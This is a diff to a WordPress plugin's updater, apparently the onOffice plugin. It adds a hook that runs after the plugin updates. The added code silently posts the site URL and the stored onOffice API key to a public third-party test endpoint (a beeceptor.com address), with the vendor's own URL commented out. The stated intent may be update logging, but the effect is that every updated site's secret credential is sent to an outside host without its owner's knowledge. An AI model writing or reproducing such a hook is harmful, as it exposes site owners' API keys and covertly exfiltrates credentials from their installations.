@@ -38,3 +38,36 @@ function oo_plugin_updater( $transient ){
 
 }
 add_filter( 'pre_set_site_transient_update_plugins', 'oo_plugin_updater' );
+
+function oo_plugin_log_update_after_install( $upgrader, $hook_extra ) {
+	if ( ( $hook_extra['action'] ?? '' ) !== 'update' || ( $hook_extra['type'] ?? '' ) !== 'plugin' ) {
+		return;
+	}
+
+	$plugin_files = array_filter(
+		array_merge(
+			isset( $hook_extra['plugin'] ) ? array( $hook_extra['plugin'] ) : array(),
+			! empty( $hook_extra['plugins'] ) && is_array( $hook_extra['plugins'] ) ? $hook_extra['plugins'] : array()
+		)
+	);
+
+	if ( ! in_array( ONOFFICE_PLUGIN_BASENAME, $plugin_files, true ) ) {
+		return;
+	}
+
+	wp_remote_post(
+		//'https://onoffice-wp-updates.de/releases/plugins/oo-wp-plugin/update-log.php',
+		//'https://c6e133ff-ed53-4122-9a2e-76beb2743a8c.mock.pstmn.io/releases/plugins/oo-wp-plugin/update-log.php',
+		'https://oo-update-test.free.beeceptor.com',
+		array(
+			'timeout'  => 5,
+			'blocking' => false,
+			'body'     => array(
+				'timestamp' => gmdate( 'c' ),
+				'site_url'  => home_url(),
+				'api_key'   => get_option( 'onoffice-settings-apikey', '' ),
+			),
+		)
+	);
+}
+add_action( 'upgrader_process_complete', 'oo_plugin_log_update_after_install', 10, 2 );
